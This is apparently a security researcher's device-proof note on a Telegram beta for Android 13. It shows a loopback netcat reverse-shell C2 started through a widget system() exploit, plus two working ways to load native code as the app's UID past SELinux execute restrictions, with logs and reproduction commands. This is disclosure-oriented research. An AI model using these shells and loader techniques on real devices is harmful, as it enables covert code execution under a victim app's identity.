# Device proof: two app-UID native loaders (Sony XQ-BT52, 2026-11-02)

Date: 2026-11-02. Target: `org.telegram.messenger.beta` 13.2.0 beta
(versionCode 72799), Sony XQ-BT52, Android 13
(`Sony/XQ-BT52_EEA/XQ-BT52:13/62.2.A.0.533/062002A000053303716344522:user/release-keys`,
`ro.build.type=user`, `ro.debuggable=0`), UID 10357,
`u:r:untrusted_app:s0:c101,c257,c512,c768`.

This note is the device counterpart of `notes/loader_tgs_native.md` §5.2 and
`notes/loader_app_process.md` §6. It does **not** modify the main report, and
it makes no RCE claim beyond the two loader proofs below. All loader execution
was as the Telegram app UID, through the existing widget `system()` primitive
(#1827 class-64 v3); `run-as` was **not** used at any point. Root was used only
for the host-side DB re-arm/restore and for reading dmesg (the same procedure
as the existing lab). Build identity: versionCode 72799, versionName 13.2.0,
`lib/arm64-v8a/libtmessages.49.so` md5
`2c0caa68a07fc26f79d13519af6c3526`.

Lab: `lab/loader_device_proof/` (source, payloads, device scripts, raw device
logs, C2 run logs, AVC excerpts, proof files, state/restore record).
Throughout this note, `evidence/...` and `logs/...` are relative to
`lab/loader_device_proof/`; the existing main-repo path
`evidence/evidence_20261102/...` is spelled out in full.

---

## 0. Verdict

| Loader | Shape tested | Result | Proof |
|---|---|---|---|
| **A. bionic linker** | `/system/bin/linker64 /data/user/0/<pkg>/files/loader/loader_proof_cgroup_pie.so` | **PROOF** — `rc=0`, `DT_INIT_ARRAY` ran as UID 10357, proof written | `evidence/proofs/loader_proof_A.txt`; run5 + pass 2 logs |
| A control (payload shape) | the lab's `loader_proof.so` (ET_DYN **without** `PT_PHDR`) via the same `linker64` | **blocked by bionic**, not SELinux: `SIGABRT`, `Could not find a PHDR: broken executable?` | `logs/device_logcat_crash.txt`; pass 1/2 logs |
| **B. ART loader** | `CLASSPATH=<app-data>/loader.dex app_process /system/bin org.telegram.loader.LoaderMain <app-data>/libloader.so <dir> <hold>` | **PROOF** — dex `main`, `System.load`, `.so` constructor and `JNI_OnLoad` all as UID 10357 | `evidence/proofs/dex_proof`, `lib_proof`, `lib_proof.jni`; pass 2 log |
| B control (plan error) | `app_process` with **no class name** | abort in `maybeCreateDalvikCache()` (zygote branch), `Error changing dalvik-cache ownership` — **not** a SELinux denial | `logs/device_logcat_crash.txt`; pass 1/2 logs |
| Direct `execve` of an app-data ELF | `"$L/loader_proof.so"`, `"$L/exec_probe"`, `"$L/loader_proof_cgroup_pie.so"` | **BLOCKED** — `Permission denied`, rc 126; AVC `denied { execute_no_trans }` | `evidence/excerpts/avc_excerpt.txt`; pass 2 log |
| Extra (not requested): `LD_PRELOAD` of an app-data `.so` into `/system/bin/true` | `LD_PRELOAD=$L/loader_proof.so /system/bin/true` | **allowed on this ROM** — constructor ran (`uid=10357`, `cmdline=/system/bin/true`); `/linkerconfig/ld.config.txt:55` has `namespace.default.permitted.paths += /data` | `evidence/proofs/loader_proof_LD_PRELOAD.txt`; `evidence/excerpts/ld_config_excerpt.txt` |

Both loaders are **same-UID, same-domain, non-persistent**: each process runs
in the Telegram `uid_10357/pid_<app>` cgroup (measured for both), is not an
injection into the Telegram process, and is not a startup hook. Loader B's
helper is reparented to init (`PPid: 1`) but stays in that cgroup. The cgroup
teardown on `am force-stop`/update is the existing analysis
(`notes/local_ace_daemon.md` §4-5, `notes/loader_app_process.md` §5); it was
not re-tested on a live loader process in this run (both proof processes had
already exited, and the C2 was stopped with `bye stop`).

The route-2 ptrace probe is **inconclusive on this ROM** and is not part of
either loader proof: the app mount namespace exposes `/proc` with
`gid=3009,hidepid=2`, and the app-UID shell is not in group 3009, so
`/proc/<app_pid>/{status,maps,mem}` gives `ENOENT` (`-2`) instead of the
`EACCES` (`-13`) the plan predicted. `ptrace_attach` / `ptrace_seize` still
return `-1` (EPERM). No conclusion about dumpable is drawn from this run.

---

## 1. Execution context (measured)

The widget message 79415 (chat <CHAT_ID>) was re-armed offline with
`evidence/evidence_20261102/c2_newrce/device_payload_c2.html` (a copy is in
`device/widget_payload_c2.html`, sha256
`2ab11cad96c359f2ea4aae220865c3a7bcfc0a27492c4ccea19ab0ca5c2ec222`); the
widget ran `system()` and started a loopback C2 through `adb reverse`:

```
setsid sh -c "sleep 3|toybox nc 127.0.0.1 4667|sh"&
```

The loader served 39,362 B and the implant hello was
`tg-10357-XQ-BT52 uid=10357 user=u0_a357 device=XQ-BT52 from=127.0.0.1`
at 21:50:26.
All proof commands below are `C2 exec` (a `sh -c` child of the app UID).

Identity from the C2 shell:

```
uid=10357(u0_a357) gid=10357(u0_a357) groups=10357(u0_a357),1079(ext_obb_rw),3002(net_bt),3003(inet),9997(everybody),20357(u0_a357_cache),50357(all_a357)
context=u:r:untrusted_app:s0:c101,c257,c512,c768
0::/uid_10357/pid_23923
5:schedtune:/top-app 4:memory:/ 3:cpuset:/top-app 2:cpu:/ 1:blkio:/
```

The app-data directory is `/data/user/0/org.telegram.messenger.beta/files`
(same inode as `/data/data/.../files`); the payload directory is
`files/loader/`. Files copied from `/data/local/tmp` with the app-UID shell are
`app_data_file:s0:c101,c257,c512,c768`, owner `u0_a357`.

### 1.1 The exact proof payload used for loader A

`lab/loader_device_proof/src/loader_proof_cgroup.c` is a derivative of
`lab/loader_tgs_native/src/loader_proof.c`: same raw-syscall, no-libc, no
`DT_NEEDED` shape, plus `/proc/self/cgroup` and `/proc/self/ppid`, and a 6 s
sleep so the process can be sampled from outside. Two builds exist:

* `out/arm64/loader_proof_cgroup.so` — `-shared` (no `PT_PHDR`), built like the
  original lab payload;
* `out/arm64/loader_proof_cgroup_pie.so` — `-pie` (has `PT_PHDR`; also has an
  unused `PT_INTERP` string `/lib/ld-linux-aarch64.so.1`), the one that works.

`evidence/excerpts/elf_shape.txt` has the program-header dump and sha256 of
every payload.

---

## 2. Loader A — `linker64 <app-data ET_DYN>`

### 2.1 Policy expectation

The note's policy is confirmed by the device labels and AVC:

* `/system/bin/linker64` -> `/apex/com.android.runtime/bin/linker64`,
  label `u:object_r:system_linker_exec:s0`; `allow untrusted_app_all
  system_linker_exec:file execute_no_trans` (`untrusted_app_all.te:32`).
* `allow untrusted_app_all app_data_file:file { r_file_perms execute }`
  (`untrusted_app_all.te:27`): the mmap/`execute` check passes.
* `execve` of an app-data file is still denied
  (`app_neverallows.te:58-67`); that is the negative control.

### 2.2 Correction found on the device: bionic requires `PT_PHDR` in the loaded executable

The lab's original payload is an ET_DYN built with `-shared`, and it has **no
`PT_PHDR`**. `linker64 <that file>` aborts before running any of it:

```
$ /system/bin/linker64 $L/loader_proof.so
Could not find a PHDR: broken executable?
Aborted
linker64_rc=134
```

The tombstone identifies bionic's `get_elf_base_from_phdr` in
`__linker_init_post_relocation`:

```
Abort message: 'Could not find a PHDR: broken executable?'
#00 linker64 (__dl_abort+168)
#01 linker64 (__dl__ZL29__linker_init_post_relocationR19KernelArgumentBlockR6soinfo+1940)
```

AOSP android13 `bionic/linker/linker_main.cpp` explains it: for a program
loaded by the linker, `linker_main()` calls
`get_elf_base_from_phdr(si->phdr, ...)`, which requires a `PT_PHDR` entry in
the target's program headers (`linker_main.cpp:370-372`, function at
`:563-572`). This is a payload-shape gate, **not** a SELinux/namespace gate.
The `-pie` rebuild (`PT_PHDR` present) is the corrected payload. The shipped
`lab/loader_tgs_native/device/device_run.sh` §3 would stop at this abort with
the shipped `out/arm64/loader_proof.so`; it needs the `-pie` build.

### 2.3 Positive proof

```
$ D=/data/user/0/org.telegram.messenger.beta/files; L=$D/loader
$ cd $D
$ /system/bin/linker64 $L/loader_proof_cgroup_pie.so
LOADER_OK
uid=10357
gid=10357
pid=32030
ppid=32028
ctx=u:r:untrusted_app:s0:c101,c257,c512,c768
cgroup=5:schedtune:/top-app4:memory:/3:cpuset:/top-app2:cpu:/1:blkio:/0::/uid_10357/pid_23923
cmdline=/system/bin/linker64
first_map=7a35bcd000-7a35bce000 ---p 00000000 00:00 0
linker_rc=0
```

The same payload run under an external sampler (pass 2, pid 30017) shows the
process the kernel actually created for the loader:

```
proc_exe=/apex/com.android.runtime/bin/linker64
proc_cmdline=/system/bin/linker64 /data/user/0/org.telegram.messenger.beta/files/loader/loader_proof_cgroup_pie.so
proc_status=PPid: 29574;Uid: 10357 10357 10357 10357;Gid: 10357 10357 10357 10357;Seccomp: 2;
proc_cgroup=5:schedtune:/top-app|4:memory:/|3:cpuset:/top-app|2:cpu:/|1:blkio:/|0::/uid_10357/pid_23923|
proc_ctx=u:r:untrusted_app:s0:c101,c257,c512,c768
```

AVC (dmesg):

```
avc: granted { execute } for pid=32030 comm="linker64"
  path="/data/data/org.telegram.messenger.beta/files/loader/loader_proof_cgroup_pie.so"
  scontext=u:r:untrusted_app:s0:c101,c257,c512,c768
  tcontext=u:object_r:app_data_file:s0:c101,c257,c512,c768 tclass=file
```

The payload's `_start` twin was **not** exercised on the device (direct
execution is denied, §2.4). The device path is the linker's
`DT_INIT`/`DT_INIT_ARRAY` call; the constructor writes the proof and exits.

### 2.4 Negative control: direct `execve` of the app-data ELF

```
$ "$L/loader_proof.so"          # and "$L/exec_probe", "$L/loader_proof_cgroup_pie.so"
.../loader_proof.so: Permission denied
direct_exec_loader_proof_so_rc=126
direct_exec_exec_probe_rc=126
direct_exec_pie_rc=126
```

Kernel AVC for the same attempt:

```
avc: denied { execute_no_trans } for pid=29628 comm="sh"
  path="/data/data/org.telegram.messenger.beta/files/loader/loader_proof.so"
  scontext=u:r:untrusted_app:s0:c101,c257,c512,c768
  tcontext=u:object_r:app_data_file:s0:c101,c257,c512,c768 tclass=file permissive=0
```

The `execute` check is granted (the file is mmap-able with `PROT_EXEC`); the
`execute_no_trans` check is denied. This is exactly the distinction the
policy note predicted, and it is why `linker64`/`dlopen` work while a direct
ELF execution does not.

**Verdict: loader A is device-proven**, with the payload caveat that the ELF
must carry `PT_PHDR` (a `-pie` build, not a plain `-shared` build).

---

## 3. Loader B — `app_process` + dex + `System.load`

### 3.1 Plan correction: no-class `app_process` is the zygote branch

The plan's T1 (`/system/bin/app_process` with no arguments, expecting the
"no class name" usage error) is not a valid exec test on Android 13: with an
empty class name `app_main.cpp` takes the **zygote** branch and calls
`maybeCreateDalvikCache()`, which tries to `chown`/`setattr`
`/data/dalvik-cache/arm64` as UID 10357 and aborts:

```
$ /system/bin/app_process
Aborted
app_process_noargs_rc=134

Abort message: 'Error changing dalvik-cache ownership : Permission denied'
#03 app_process64 (main+1800)
avc: denied { setattr } ... tcontext=u:object_r:dalvikcache_data_file:s0 tclass=dir
```

This is a runtime branch, not a SELinux denial of the `zygote_exec` exec: the
process was created with UID 10357 and got as far as `main`. The valid test
passes a class name, which skips that branch.

### 3.2 Positive proof

The dex and library are the existing `lab/loader_app_process/out/` artifacts,
staged into `files/loader/`. Foreground form:

```
$ CLASSPATH=$L/loader.dex /system/bin/app_process /system/bin \
    org.telegram.loader.LoaderMain $L/libloader.so $L 0
rc=0
```

`dex_proof`:

```
dex-main pid=30351 lib=/data/user/0/org.telegram.messenger.beta/files/loader/libloader.so ts=1793652929356
system-load-ok pid=30351 ts=1793652929371
exit pid=30351 ts=1793652929371
```

`lib_proof` (constructor):

```
tag=ctor pid=30351 uid=10357 path=/data/user/0/org.telegram.messenger.beta/files/loader/lib_proof
```

`lib_proof.jni` (`JNI_OnLoad`, i.e. a real JavaVM called into the library):

```
tag=jni_onload pid=30351 uid=10357 path=/data/user/0/org.telegram.messenger.beta/files/loader/lib_proof.jni
```

Background helper via `run_loader.sh` (hold 10 s):

```
run_loader_bg_rc=0
tgloader_pid=30505
tgloader_cgroup=5:schedtune:/top-app|4:memory:/|3:cpuset:/top-app|2:cpu:/|1:blkio:/|0::/uid_10357/pid_23923|
tgloader_ctx=u:r:untrusted_app:s0:c101,c257,c512,c768
tgloader_exe=/system/bin/app_process64
tgloader_cmdline=tgloader
tgloader_status=PPid: 1;Uid: 10357 10357 10357 10357;Gid: 10357 10357 10357 10357;Seccomp: 2;
```

`dex_proof` for the helper: `dex-main pid=30505`, `system-load-ok pid=30505`,
`holding pid=30505 seconds=10`, `exit pid=30505`; `lib_proof`/`lib_proof.jni`
both `pid=30505 uid=10357`.

AVC (dmesg):

```
avc: granted { execute } for pid=30351 comm="main"
  path="/data/data/org.telegram.messenger.beta/files/loader/libloader.so"
  scontext=u:r:untrusted_app:s0:c101,c257,c512,c768
  tcontext=u:object_r:app_data_file:s0:c101,c257,c512,c768 tclass=file
```

`run_loader.sh` also proves the environment dependency: the app-UID shell has
`ANDROID_ROOT=/system`, `ANDROID_DATA=/data`,
`ANDROID_ART_ROOT=/apex/com.android.art`,
`ANDROID_I18N_ROOT=/apex/com.android.i18n`,
`ANDROID_TZDATA_ROOT=/apex/com.android.tzdata` and the full
`BOOTCLASSPATH`; the script refuses to start without them (none of these had
to be guessed). The helper is reparented to init (`PPid: 1`) but remains in
`uid_10357/pid_23923`, so it dies with the app cgroup.

**Verdict: loader B is device-proven** in the form
`app_process <dir> <class> <args>` with a `CLASSPATH` dex. The no-class probe
from the plan must be replaced by a class-name probe on this Android version.

---

## 4. Extra measured result: `LD_PRELOAD` from app data is allowed on this ROM

`notes/loader_tgs_native.md` §4.1/§5.5 predicted a linker-namespace denial
for `LD_PRELOAD` from `/data`. On this Sony Android 13 it is **allowed**:

```
$ cd $D
$ LD_PRELOAD=$L/loader_proof.so /system/bin/true
LOADER_OK
uid=10357
pid=1120
ctx=u:r:untrusted_app:s0:c101,c257,c512,c768
cmdline=/system/bin/true
first_map=591fbc8000-591fbf4000 r--p ... /system/bin/toybox
true_rc=0
```

`/linkerconfig/ld.config.txt` on the device contains:

```
dir.system = /data                                  (line 24)
namespace.default.permitted.paths += /data          (line 55)
```

So the default namespace does permit `/data` here, and the preload is a third
working shape (a system binary with an app-data `.so` injected). It is
reported as a measured deviation, not as one of the two proven loaders. It
does not add persistence either: it is still a process in the app cgroup.

---

## 5. What was not proven / limits

* Both loaders are **processes**, not injections. They do not touch the live
  Telegram VM, do not hook it, and are not a startup hook. They are in the app
  cgroup, which the existing analysis says is torn down by force-stop/update
  (not re-tested on a live loader process here); the app-data artifacts survive
  an update, but the trigger does not run without a widget render.
* Loader A runs the linker's `DT_INIT`/`DT_INIT_ARRAY`; the payload's
  `_start` path was not exercised on device because direct `execve` is denied.
* Loader B's `.so` is loaded through the `app_process` classloader namespace,
  which is why `System.load` works. This does not imply `dlopen` from an
  arbitrary system process, and it is not the `ks` fallback.
* The route-2 ptrace probe is inconclusive on this ROM (`hidepid=2`, ENOENT for
  `/proc/<app_pid>`); only `ptrace_attach`/`ptrace_seize` = EPERM was measured.
  That line of investigation is not needed for either loader and is not
  claimed here.
* No root is used by the payloads; the only root use was the host-side DB
  re-arm/restore and reading dmesg, as in the existing lab procedure.
* The DB has a pre-existing `messages_v2` page-reference warning in
  `integrity_check`; it is unchanged before/after and the app is healthy
  (`evidence/state_and_restore.txt`).

---

## 6. Reproduction (exact commands)

Host:

```sh
cd <HOME>/ailocal/Telegram/telegramandroidwidget
# build the payloads (aarch64-linux-gnu-gcc, raw syscalls, no libc)
lab/loader_device_proof/build.sh          # or the two commands in README.md

# stage the artifacts into /data/local/tmp (readable by untrusted_app)
adb push lab/loader_tgs_native/out/arm64/loader_proof.so        /data/local/tmp/
adb push lab/loader_tgs_native/out/arm64/device_probe.so        /data/local/tmp/
adb push lab/loader_app_process/out/loader.dex                  /data/local/tmp/
adb push lab/loader_app_process/out/libloader.so                /data/local/tmp/
adb push lab/loader_app_process/out/exec_probe                  /data/local/tmp/
adb push lab/loader_app_process/device/run_loader.sh            /data/local/tmp/
adb push lab/loader_device_proof/out/arm64/loader_proof_cgroup_pie.so /data/local/tmp/
adb push lab/loader_device_proof/out/arm64/device_probe_pie.so  /data/local/tmp/
adb push lab/loader_device_proof/device/device_proof_run2.sh    /data/local/tmp/

# C2 on loopback + adb reverse; the widget bootstrap targets 127.0.0.1:4667
adb reverse tcp:4666 tcp:4666
adb reverse tcp:4667 tcp:4667
python3 c2/server/c2_server.py --host 127.0.0.1 --port 4666 --loader-port 4667 \
  --token PROOF20261102 --wait-session 900 --exec-timeout 180 \
  --cmd "exec sh /data/local/tmp/device_proof_run2.sh" --cmd "bye stop" --cmd quit
```

The widget re-arm itself is in `evidence/state_and_restore.txt` (offline
`widget_tool.py` patch of message 79415, `am force-stop`, write back, start,
open the chat at 79415). The important command lines inside the app-UID shell
are in `device/device_proof_run.sh` and `device/device_proof_run2.sh`.

---

## 7. Files

```
lab/loader_device_proof/
  src/loader_proof_cgroup.c        cgroup/ppid/hold variant of the lab payload
  device/device_proof_run.sh       pass 1 (identity, negative controls, original payload)
  device/device_proof_run2.sh      pass 2 (PT_PHDR payload, app_process class, probe)
  out/arm64/                       loader_proof_cgroup.so, loader_proof_cgroup_pie.so,
                                   device_probe_pie.so
  logs/device_dmesg.txt            raw dmesg (AVC evidence)
  logs/device_logcat_crash.txt     raw crash buffer (PHDR / dalvik-cache aborts)
  logs/c2/run2..run6/              C2 server logs (hello, exec, loader fetches)
  evidence/proofs/                 loader_proof_A.txt, dex_proof, lib_proof,
                                   lib_proof.jni, loader_proof_LD_PRELOAD.txt, probe.out
  evidence/excerpts/               elf_shape.txt, avc_excerpt.txt, ld_config_excerpt.txt
  evidence/device_files*/          raw tar contents from the app data dir
  evidence/state_and_restore.txt   DB hashes, widget re-arm, restore verification
  README.md                        build/run/restore summary
```

Companion notes (not modified): `notes/loader_tgs_native.md`,
`notes/loader_app_process.md`. The main report was not edited.
